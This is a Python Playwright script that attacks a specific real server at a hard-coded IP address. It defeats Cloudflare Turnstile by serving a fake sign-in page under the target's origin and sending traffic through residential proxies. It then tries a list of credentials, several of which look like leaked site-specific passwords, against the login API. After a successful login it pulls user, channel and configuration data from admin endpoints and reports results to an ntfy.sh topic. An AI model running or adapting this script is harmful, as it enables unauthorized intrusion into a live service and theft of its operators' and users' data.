#!/usr/bin/env python3
"""Turnstile solve on the real .37 origin + first-ever credential comparison on /api/user/login.

Key differences vs previous attempts:
  * the sign-in document is fulfilled locally (route.fulfill) as a minimal page -> the 2.3MB SPA
    never loads (residential links are slow), but the document URL/origin stays
    http://135.148.204.37/sign-in so the widget's domain check passes.
  * the browser egresses through bridge.py (plain HTTP proxy -> residential SOCKS5/HTTP upstream),
    so Cloudflare sees a residential IP for BOTH the challenge and the login POST (same remoteip).
  * brunhild*.challenges.cloudflare.com is mapped to Cloudflare IPv4 inside the bridge (name map),
    sidestepping the IPv6-only DNS that killed earlier runs.
"""
import json, os, sys, time, re, base64
from playwright.sync_api import sync_playwright

TARGET = os.environ.get("TARGET", "http://135.148.204.37")
SITEKEY = os.environ.get("SITEKEY", "0x4AAAAAAGDEObVt9sc3zTw_")
BRIDGE = os.environ.get("BRIDGE", "http://127.0.0.1:8899")
MODE = os.environ.get("MODE", "proxy")          # proxy | direct
BUDGET = int(os.environ.get("BUDGET", "170"))   # seconds to wait for a token
NT = os.environ.get("NT", "")
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/157.0.0.0 Safari/537.36")

MINI = """<!doctype html><html><head><meta charset="utf-8"><title>Sign In</title>
<style>body{font-family:system-ui;margin:40px}#c{margin-top:10px}</style></head>
<body><h1>Sign In</h1><div id="c"></div>
<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit&onload=cb_onload"></script>
<script>
window.__tok=""; window.__err="";
function cb_onload(){
  try{
    var w = turnstile.render("#c", {sitekey:"%s", theme:"light", size:"normal",
      callback:function(t){window.__tok=t; document.title="TOK:"+t.length;},
      "error-callback":function(e){window.__err="cb:"+e;},
      "timeout-callback":function(){window.__err="timeout";}});
    window.__wid = w;
  }catch(e){window.__err="render:"+e;}
}
</script></body></html>""" % SITEKEY

CREDS = [
    ("root", "xinhuo.yibuapi!@#"),
    ("root", "123456"),
    ("admin", "xinhuo.yibuapi!@#"),
    ("root", "NewSecurePassword123!"),
    ("administrator", "xinhuo.yibuapi!@#"),
    ("yangxiaokai", "xinhuo.yibuapi!@#"),
    ("haoyang", "xinhuo.yibuapi!@#"),
    ("i33953admin", "xinhuo.yibuapi!@#"),
    ("root", "12345678"),
    ("root", "6iHKLZEmQQ4BesSg"),
    ("admin", "NewPassword123!"),
    ("root", "yibumysql"),
]


def log(*a):
    print("[s]", *a, flush=True)


def ntfy(msg):
    if not NT:
        return
    try:
        import urllib.request
        urllib.request.urlopen(urllib.request.Request(
            "https://ntfy.sh/%s" % NT, data=msg.encode()[:3500],
            headers={"Title": "i53759"}), timeout=10)
    except Exception as e:
        log("ntfy err", str(e)[:80])


def solve_once(p, proxy_cfg, budget, tag):
    """Launch browser, serve minimal page at TARGET/sign-in, wait for a token."""
    args = ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
            "--disable-blink-features=AutomationControlled",
            "--disable-features=CalculateNativeWinOcclusion",
            "--lang=en-US", "--window-size=1280,900"]
    kw = dict(channel="chrome", headless=False, args=args)
    if proxy_cfg:
        kw["proxy"] = {"server": proxy_cfg}
    browser = p.chromium.launch(**kw)
    ctx = browser.new_context(user_agent=UA, locale="en-US", timezone_id="America/New_York",
                              viewport={"width": 1280, "height": 900}, ignore_https_errors=True)
    page = ctx.new_page()
    reqlog = []
    cons = []

    def on_console(m):
        txt = m.text[:200]
        if any(k in txt.lower() for k in ("turnstile", "challenge", "error", "fail", "token")):
            cons.append(txt)

    page.on("console", on_console)
    page.on("requestfailed", lambda r: reqlog.append("%s %s" % (r.url[:90], r.failure)))

    def route(r):
        u = r.request.url
        if u.startswith(TARGET) and r.request.resource_type == "document":
            r.fulfill(status=200, content_type="text/html; charset=utf-8", body=MINI)
        elif "challenges.cloudflare.com" in u:
            r.continue_()
        elif u.startswith(TARGET):
            r.continue_()
        else:
            r.abort()

    page.route("**/*", route)
    t0 = time.time()
    try:
        page.goto(TARGET + "/sign-in", wait_until="commit", timeout=60000)
    except Exception as e:
        log(tag, "goto err", str(e)[:120])
    log(tag, "url", page.url, "title", page.title()[:40])

    tok = ""
    clicked = 0
    deadline = time.time() + budget
    last_frames = []
    while time.time() < deadline:
        try:
            tok = page.evaluate("window.__tok || ''")
        except Exception:
            tok = ""
        if tok:
            break
        # try clicking the widget checkbox every ~15s
        if time.time() - t0 > 12 and clicked < 4 and int(time.time() - t0) % 15 < 2:
            try:
                ifr = page.query_selector("iframe")
                if ifr:
                    bb = ifr.bounding_box()
                    if bb:
                        page.mouse.click(bb["x"] + 30, bb["y"] + 32)
                        clicked += 1
                        log(tag, "clicked widget at", round(bb["x"]), round(bb["y"]), "n", clicked)
            except Exception as e:
                log(tag, "click err", str(e)[:60])
        try:
            last_frames = [f.url[:110] for f in page.frames]
        except Exception:
            pass
        time.sleep(2)

    info = {"tag": tag, "token_len": len(tok), "elapsed": round(time.time() - t0, 1),
            "frames": last_frames, "console": cons[-25:], "reqfail": reqlog[-15:]}
    try:
        info["err"] = page.evaluate("window.__err || ''")
        info["widget"] = page.evaluate("typeof window.__wid !== 'undefined' ? String(window.__wid) : ''")
        info["nturnstile_iframes"] = page.evaluate("document.querySelectorAll('iframe').length")
    except Exception:
        pass
    return browser, ctx, page, tok, info


def do_login(page, tok, results):
    """First real credential comparison: same browser, same residential egress as the token."""
    attempts = []
    for u, pw in CREDS:
        js = """async (a) => {
            try{
              const r = await fetch('/api/user/login?turnstile=' + encodeURIComponent(a.tok), {
                method:'POST', credentials:'include',
                headers:{'Content-Type':'application/json','Accept':'application/json'},
                body: JSON.stringify({username:a.u, password:a.p})
              });
              const t = await r.text();
              return {status:r.status, body:t.slice(0,600)};
            }catch(e){ return {status:-1, body:String(e)}; }
        }"""
        try:
            res = page.evaluate(js, {"tok": tok, "u": u, "p": pw})
        except Exception as e:
            res = {"status": -2, "body": str(e)[:200]}
        attempts.append({"u": u, "p": pw[:6] + "...", "status": res.get("status"), "body": res.get("body", "")[:400]})
        log("LOGIN", u, res.get("status"), (res.get("body") or "")[:220])
        if res.get("status") == 200 and '"success":true' in (res.get("body") or ""):
            log("!!! LOGIN SUCCESS", u)
            results["login"] = {"username": u, "password": pw, "resp": res.get("body")}
            break
        time.sleep(2.0)
    results["attempts"] = attempts
    return results.get("login")


def harvest(page, uid, results):
    def get(path, extra=None):
        js = """async (a) => { const r = await fetch(a.p, {credentials:'include', headers:a.h||{}});
            const t = await r.text(); return {status:r.status, body:t.slice(0,4000)}; }"""
        h = {"Accept": "application/json"}
        if uid:
            h["New-API-User"] = str(uid)
        if extra:
            h.update(extra)
        return page.evaluate(js, {"p": path, "h": h})

    out = {}
    for path in ["/api/user/self", "/api/option/", "/api/deployments", "/api/user/?p=1&page_size=20",
                 "/api/channel/?p=1&page_size=20"]:
        try:
            r = get(path)
            out[path] = {"status": r["status"], "body": r["body"][:1200]}
            log("HARVEST", path, r["status"], r["body"][:200].replace("\n", " "))
        except Exception as e:
            out[path] = {"err": str(e)[:120]}
    results["harvest"] = out


def main():
    results = {"mode": MODE, "target": TARGET, "sitekey": SITEKEY, "ts": time.strftime("%F %T")}
    with sync_playwright() as p:
        # 1) primary attempt
        cfg = None if MODE == "direct" else {"server": BRIDGE}
        b, ctx, page, tok, info = solve_once(p, cfg, BUDGET, MODE)
        results["solve"] = info
        log("SOLVE", json.dumps(info)[:1200])
        ntfy("solve mode=%s token_len=%d frames=%s err=%s" % (MODE, len(tok), len(info.get("frames") or []), info.get("err", "")[:80]))
        if tok:
            results["token"] = tok
            login = do_login(page, tok, results)
            if login:
                uid = None
                try:
                    uid = json.loads(login["resp"])["data"]["id"]
                except Exception:
                    try:
                        uid = re.search(r'"id":(\d+)', login["resp"]).group(1)
                    except Exception:
                        pass
                harvest(page, uid, results)
                ntfy("LOGIN_SUCCESS %s" % login["username"])
            else:
                ntfy("token obtained but no credential hit (%d tries)" % len(results.get("attempts") or []))
        else:
            ntfy("NO_TOKEN mode=%s" % MODE)
        try:
            page.screenshot(path="last_%s.png" % MODE)
            open("last_%s.html" % MODE, "w").write(page.content()[:20000])
        except Exception:
            pass
        try:
            ctx.close(); b.close()
        except Exception:
            pass
    json.dump(results, open("results_%s.json" % MODE, "w"), indent=1)
    print("RESULTS_JSON " + json.dumps(results)[:3000], flush=True)


if __name__ == "__main__":
    main()